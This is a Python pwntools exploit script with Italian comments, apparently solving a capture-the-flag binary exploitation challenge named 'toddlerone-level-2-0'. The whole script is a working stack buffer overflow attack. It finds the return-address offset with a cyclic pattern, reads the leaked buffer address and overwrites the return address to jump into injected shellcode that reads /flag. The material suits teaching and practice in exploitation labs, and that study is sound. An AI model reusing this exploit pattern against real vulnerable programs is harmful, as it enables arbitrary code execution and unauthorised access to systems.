from pwn import * 

# Setta l'architettura
context.arch = 'amd64'

elf = ELF('/challenge/toddlerone-level-2-0')

io = elf.process(setuid=False)

# Find Stack length
io.sendline("512")
io.sendline(cyclic(512, n=8))
io.wait()

buff_len = cyclic_find(io.corefile.fault_addr, n=8)

# Start again the process
io = elf.process()

# Find the buff address
io.recvuntil(b"The input buffer begins at 0x")
badd = io.recvuntil(b',').decode()[:-1]
# Shellcode dopo, il buffer è troppo piccolo
sc_addr = p64(int(badd, 16) + buff_len + 8)

# Fa il cat della flag, per noi basta, può fare un po' qualsiasi cosa
# asm è un modulo per assemblare il codice assembly
sc = asm(shellcraft.cat("/flag"))


# Crea il payload
padding = b'A'*(buff_len)   # Calcola il padding 
payload = padding + sc_addr + sc

io.sendline(f"{len(payload)}")
io.sendline(payload)

io.interactive()
